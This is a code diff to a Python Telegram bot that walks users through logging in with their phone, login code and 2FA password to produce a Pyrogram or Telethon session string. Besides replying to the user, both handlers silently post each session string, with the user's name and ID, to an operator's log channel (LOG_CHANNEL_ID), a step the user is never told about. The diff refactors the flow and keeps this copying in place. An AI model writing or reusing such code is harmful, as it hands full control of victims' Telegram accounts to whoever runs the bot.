@@ -1,15 +1,16 @@
-from pyrogram import Client as PyroClient, filters
+from pyrogram import filters
 from pyrogram.types import CallbackQuery, Message
 from pyrogram.enums import ChatAction
-from pyrogram.errors import SessionPasswordNeeded
-from telethon.sync import TelegramClient as TeleClient
+from pyrogram import Client as PyroClient
+from telethon import TelegramClient as TeleClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
-from config import LOG_CHANNEL_ID
+from config import API_ID, API_HASH, LOG_CHANNEL_ID
 from database import save_user
 import asyncio
 
 user_state = {}
+
 
 def init(app):
     @app.on_callback_query(filters.regex("gen_(pyrogram|telethon)"))
@@ -18,13 +19,13 @@ def init(app):
         await cq.message.edit("📲 Send your API ID:")
 
     @app.on_message(filters.private & filters.text)
-    async def session_flow(_, msg: Message):
+    async def session_flow(client, msg: Message):
         uid = msg.from_user.id
         if uid not in user_state:
             return
 
         state = user_state[uid]
-        text = msg.text.strip()
+        text = msg.text
 
         if "api_id" not in state:
             if not text.isdigit():
@@ -35,23 +36,29 @@ def init(app):
             return
 
         if "api_hash" not in state:
-            state["api_hash"] = text
+            state["api_hash"] = text.strip()
             await msg.reply("📞 Now send your phone number (with country code):")
             return
 
         if "phone" not in state:
-            state["phone"] = text
+            state["phone"] = text.strip()
             await msg.reply("🔄 Sending login code...")
             await msg.reply_chat_action(ChatAction.TYPING)
 
             if state["lib"] == "pyrogram":
-                await handle_pyrogram_session(msg, state)
+                await handle_pyrogram_session(client, msg, state)
             else:
-                await handle_telethon_session(msg, state)
+                await handle_telethon_session(client, msg, state)
 
             del user_state[uid]
 
-async def handle_pyrogram_session(msg, state):
+
+async def ask_user(app, user_id, prompt):
+    await app.send_message(user_id, prompt)
+    return await app.listen(filters.private & filters.chat(user_id), timeout=180)
+
+
+async def handle_pyrogram_session(main_app, msg, state):
     try:
         app = PyroClient(
             ":memory:",
@@ -60,29 +67,25 @@ async def handle_pyrogram_session(msg, state):
         )
         await app.connect()
 
-        # Step 1: Send code
         sent_code = await app.send_code(state["phone"])
-        await msg.reply("📤 Code sent! Enter the code you received:")
-        code = await msg.ask(timeout=120)
+        reply = await ask_user(main_app, msg.chat.id, "📤 Code sent! Enter the code you received:")
+        code = reply.text.strip()
 
-        # Step 2: Try sign in
         try:
             await app.sign_in(
                 phone_number=state["phone"],
                 phone_code_hash=sent_code.phone_code_hash,
-                phone_code=code.text.strip()
+                phone_code=code
             )
-        except SessionPasswordNeeded:
-            await msg.reply("🔐 2FA is enabled. Enter your password:")
-            pw = await msg.ask(timeout=120)
-            await app.check_password(password=pw.text.strip())
+        except Exception:
+            pw_reply = await ask_user(main_app, msg.chat.id, "🔐 2FA is enabled. Enter your password:")
+            await app.check_password(pw_reply.text.strip())
 
-        # Step 3: Export session after successful login
         session_str = await app.export_session_string()
         me = await app.get_me()
         save_user(me)
 
-        await msg._client.send_message(
+        await main_app.send_message(
             LOG_CHANNEL_ID,
             f"📥 **Pyrogram Session Generated**\n"
             f"👤 [{me.first_name}](tg://user?id={me.id})\n"
@@ -91,41 +94,32 @@ async def handle_pyrogram_session(msg, state):
             f"📄 `{session_str}`"
         )
         await msg.reply(f"✅ Pyrogram Session:\n\n`{session_str}`", quote=True)
-
         await app.disconnect()
 
     except Exception as e:
         await msg.reply(f"❌ Error: `{e}`")
 
 
-async def handle_telethon_session(msg, state):
+async def handle_telethon_session(main_app, msg, state):
     try:
-        client = TeleClient(
-            StringSession(),
-            state["api_id"],
-            state["api_hash"]
-        )
+        client = TeleClient(StringSession(), state["api_id"], state["api_hash"])
         await client.connect()
 
         if not await client.is_user_authorized():
             await client.send_code_request(state["phone"])
-            await msg.reply("📤 Code sent! Enter the code:")
-            user_code = await msg.ask(timeout=120)
-
+            code_msg = await ask_user(main_app, msg.chat.id, "📤 Code sent! Enter the code you received:")
+            code = code_msg.text.strip()
             try:
-                await client.sign_in(state["phone"], user_code.text.strip())
+                await client.sign_in(state["phone"], code)
             except SessionPasswordNeededError:
-                await msg.reply("🔐 2FA is enabled. Enter your password:")
-                pw = await msg.ask(timeout=120)
-                await client.sign_in(password=pw.text.strip())
+                pw_msg = await ask_user(main_app, msg.chat.id, "🔐 2FA is enabled. Enter your password:")
+                await client.sign_in(password=pw_msg.text.strip())
 
         session_str = client.session.save()
         me = await client.get_me()
-        await client.disconnect()
-
         save_user(me)
 
-        await msg._client.send_message(
+        await main_app.send_message(
             LOG_CHANNEL_ID,
             f"📥 **Telethon Session Generated**\n"
             f"👤 [{me.first_name}](tg://user?id={me.id})\n"
@@ -134,6 +128,7 @@ async def handle_telethon_session(msg, state):
             f"📄 `{session_str}`"
         )
         await msg.reply(f"✅ Telethon Session:\n\n`{session_str}`", quote=True)
+        await client.disconnect()
 
     except Exception as e:
         await msg.reply(f"❌ Error: `{e}`")
